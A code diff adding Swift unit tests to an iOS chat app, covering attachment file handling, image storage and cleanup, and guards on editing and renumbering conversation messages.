+    @Test func attachmentResolvesItsFileInsideTheCurrentContainer() throws {
+        let attachment = MessageAttachment(
+            type: .image,
+            fileURL: URL(fileURLWithPath: "/an/old/container/pic.jpg"),
+            fileName: "pic.jpg"
+        )
+
+        let documents = try FileManager.default.url(
+            for: .documentDirectory, in: .userDomainMask, appropriateFor: nil, create: false
+        )
+        let expected = documents.appendingPathComponent("Attachments").appendingPathComponent("pic.jpg")
+
+        #expect(attachment.actualFileURL.standardizedFileURL == expected.standardizedFileURL)
+    }
+
+    @Test func attachmentAnalysisResultRoundTripsWithASummary() {
+        let attachment = MessageAttachment(
+            type: .image,
+            fileURL: URL(fileURLWithPath: "pic.jpg"),
+            fileName: "pic.jpg"
+        )
+        let result = VisionAnalysisResult(
+            objects: [DetectedObject(label: "cat", confidence: 0.9, boundingBox: .zero)],
+            sceneLabels: ["indoor"]
+        )
+
+        attachment.storeAnalysisResult(result)
+
+        #expect(attachment.detectionProcessed)
+        #expect(attachment.detectionSummary?.isEmpty == false)
+        #expect(attachment.getAnalysisResult()?.objects.map(\.label) == ["cat"])
+        #expect(attachment.getDetectionResults()?.count == 1)
+    }
+
+    @Test func attachmentDecodesLegacyDetectionPayloads() throws {
+        let attachment = MessageAttachment(
+            type: .image,
+            fileURL: URL(fileURLWithPath: "pic.jpg"),
+            fileName: "pic.jpg"
+        )
+        // Chats saved before the payload became a VisionAnalysisResult still hold
+        // a bare object array; those attachments must keep opening.
+        attachment.analysisResultsData = try JSONEncoder().encode(
+            [DetectedObject(label: "dog", confidence: 0.5, boundingBox: .zero)]
+        )
+
+        #expect(attachment.getAnalysisResult()?.objects.map(\.label) == ["dog"])
+    }
+
+    @Test func attachmentWithoutAnalysisReturnsNothing() {
+        let attachment = MessageAttachment(
+            type: .image,
+            fileURL: URL(fileURLWithPath: "pic.jpg"),
+            fileName: "pic.jpg"
+        )
+
+        #expect(attachment.getAnalysisResult() == nil)
+        #expect(attachment.getDetectionResults() == nil)
+        #expect(!attachment.detectionProcessed)
+    }
+
+    // MARK: - Image store
+
+    @Test func imageStoreSavesAReadableDownscaledImage() async throws {
+        let store = ImageStore.shared
+        let url = try await store.save(image: makeTestImage(width: 2_000, height: 1_000), maxDimension: 200)
+        defer { Task { try? await store.delete(url: url) } }
+
+        let metrics = await store.imageMetrics(at: url)
+        let unwrapped = try #require(metrics)
+        #expect(max(unwrapped.width, unwrapped.height) <= 200)
+        #expect(unwrapped.byteSize > 0)
+        #expect(FileManager.default.fileExists(atPath: url.path))
+    }
+
+    @Test func recentlySavedImagesSurviveOrphanCleanup() async throws {
+        // A just-attached image is not yet referenced by a saved message. The
+        // protection window is what stops cleanup from deleting it underneath.
+        let store = ImageStore.shared
+        let url = try await store.save(image: makeTestImage(width: 60, height: 40), maxDimension: 60)
+        defer { Task { try? await store.delete(url: url) } }
+
+        try await store.cleanupOrphanedFiles(referencedURLs: [])
+
+        #expect(FileManager.default.fileExists(atPath: url.path))
+    }
+
+    @Test func imageStoreRejectsDegenerateImages() async {
+        let store = ImageStore.shared
+        await #expect(throws: (any Error).self) {
+            _ = try await store.save(image: UIImage())
+        }
+    }
+
+    // MARK: - Conversation editing guards
+
+    @Test func rewindRefusesWhileAGenerationIsInFlight() throws {
+        let viewModel = try makeChat([(.user, "First"), (.assistant, "Answer")])
+        let firstID = viewModel.conversation.messages.sortedByOrder[0].id
+        let before = viewModel.conversation.messages.sortedByOrder.map(\.text)
+
+        viewModel.isGenerating = true
+        #expect(viewModel.rewindForEditingUserMessage(messageID: firstID) == nil)
+        viewModel.isGenerating = false
+
+        viewModel.isRegenerating = true
+        #expect(viewModel.rewindForEditingUserMessage(messageID: firstID) == nil)
+        viewModel.isRegenerating = false
+
+        // A refused rewind must not have deleted anything on its way out.
+        #expect(viewModel.conversation.messages.sortedByOrder.map(\.text) == before)
+    }
+
+    @Test func rewindRefusesForAssistantTurnsAndUnknownIdentifiers() throws {
+        let viewModel = try makeChat([(.user, "First"), (.assistant, "Answer")])
+        let messages = viewModel.conversation.messages.sortedByOrder
+
+        #expect(viewModel.rewindForEditingUserMessage(messageID: messages[1].id) == nil)
+        #expect(viewModel.rewindForEditingUserMessage(messageID: UUID()) == nil)
+        #expect(viewModel.conversation.messages.count == 2)
+    }
+
+    @Test func rewindWithoutReplacementTextKeepsTheOriginalWording() throws {
+        let viewModel = try makeChat([(.user, "Original"), (.assistant, "Answer")])
+        let first = viewModel.conversation.messages.sortedByOrder[0]
+
+        let result = try #require(viewModel.rewindForEditingUserMessage(messageID: first.id))
+
+        #expect(result.restoredText == "Original")
+        #expect(result.messageID == first.id)
+        #expect(viewModel.conversation.messages.map(\.text) == ["Original"])
+    }
+
+    @Test func renumberingClosesGapsLeftBehindByRemovedTurns() throws {
+        let viewModel = try makeChat([(.user, "a"), (.assistant, "b"), (.user, "c")])
+        let messages = viewModel.conversation.messages.sortedByOrder
+        viewModel.conversation.messages.removeAll { $0.id == messages[1].id }
+
+        viewModel.renumberMessagesByOrder()
+
+        #expect(viewModel.conversation.messages.sortedByOrder.map(\.order) == [0, 1])
+        #expect(viewModel.conversation.messages.sortedByOrder.map(\.text) == ["a", "c"])
+    }
+
+    @Test func deletingATurnRenumbersWhatRemains() async throws {
+        let viewModel = try makeChat([(.user, "a"), (.assistant, "b"), (.user, "c")])
+        let target = viewModel.conversation.messages.sortedByOrder[0]
+
+        await viewModel.deleteMessageAndMaybeTrim(target)
+
+        #expect(viewModel.conversation.messages.sortedByOrder.map(\.text) == ["b", "c"])
+        #expect(viewModel.conversation.messages.sortedByOrder.map(\.order) == [0, 1])
+    }
+
+    // MARK: - Test helpers
+    /// A persisted conversation seeded with finished turns, for editing tests.
+    private func makeChat(_ turns: [(MessageRole, String)]) throws -> ChatViewModel {
+        let schema = Schema([Conversation.self, ChatLLM.Message.self, MessageAttachment.self])
+        let container = try ModelContainer(
+            for: schema,
+            configurations: [ModelConfiguration(isStoredInMemoryOnly: true)]
+        )
+        let context = ModelContext(container)
+        let conversation = Conversation(title: "Test")
+        context.insert(conversation)
+        conversation.messages = turns.enumerated().map { index, turn in
+            ChatLLM.Message(
+                role: turn.0,
+                text: turn.1,
+                order: index,
+                conversation: conversation,
+                isFinal: true
+            )
+        }
+        try context.save()
+        return ChatViewModel(generator: TestLLMGenerator(), context: context, conversation: conversation)
+    }
+
+
+    /// An isolated `UserDefaults` domain so settings tests never touch the
+    /// simulator's real preferences or each other's.
+    private func makeScratchDefaults(_ label: String) throws -> UserDefaults {
+        let suite = "ChatLLMTests." + label.replacingOccurrences(of: "()", with: "")
+        let defaults = try #require(UserDefaults(suiteName: suite))
+        defaults.removePersistentDomain(forName: suite)
+        return defaults
+    }
+
+    private func makeTestImage(width: Int, height: Int) -> UIImage {
+        let size = CGSize(width: width, height: height)
+        return UIGraphicsImageRenderer(size: size).image { context in
+            UIColor.systemTeal.setFill()
+            context.fill(CGRect(origin: .zero, size: size))
+        }
     }
 
     private func makeSearchBridge() throws -> AppWebSearchToolBridge {
